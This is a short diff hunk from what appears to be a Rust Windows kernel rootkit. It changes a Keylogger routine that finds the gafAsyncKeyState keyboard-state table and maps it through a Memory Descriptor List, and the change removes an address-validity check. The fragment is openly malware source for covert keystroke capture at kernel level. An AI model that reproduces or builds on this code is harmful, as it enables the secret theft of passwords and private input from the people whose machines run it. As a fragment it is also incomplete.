@@ -113,11 +113,6 @@ impl Keylogger {
         // Retrieve the address of gafAsyncKeyState
         let gaf_async_key_state_address = Self::get_gafasynckeystate_address()?;
 
-        // Validate the address before proceeding
-        if MmIsAddressValid(gaf_async_key_state_address.cast()) == 0 {
-            return Err(ShadowError::FunctionExecutionFailed("MmIsAddressValid", line!()));
-        }
-
         // Allocate an MDL (Memory Descriptor List) to manage the memory
         let mdl = IoAllocateMdl(gaf_async_key_state_address.cast(), size_of::<[u8; 64]>() as u32, 0, 0, null_mut());
         if mdl.is_null() {
